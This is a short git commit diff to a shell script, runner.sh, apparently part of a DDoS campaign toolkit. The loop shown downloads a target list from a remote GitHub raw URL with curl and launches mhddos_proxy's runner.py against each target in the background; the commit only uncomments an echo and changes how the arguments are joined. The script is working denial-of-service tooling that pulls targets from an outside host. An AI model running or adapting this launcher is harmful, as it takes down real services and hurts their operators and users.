2446537070644beefa4ee9dbc12be1520cf0f883
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-17 17:54:23 +0200

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -73,8 +73,8 @@ do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^-p")")
            
-            #echo $cmd_line
-            python3 ~/mhddos_proxy/runner.py""$cmd_line&
+            echo $cmd_line
+            python3 ~/mhddos_proxy/runner.py$cmd_line&
    done
 echo -e "#####################################\n"
 sleep $restart_interval
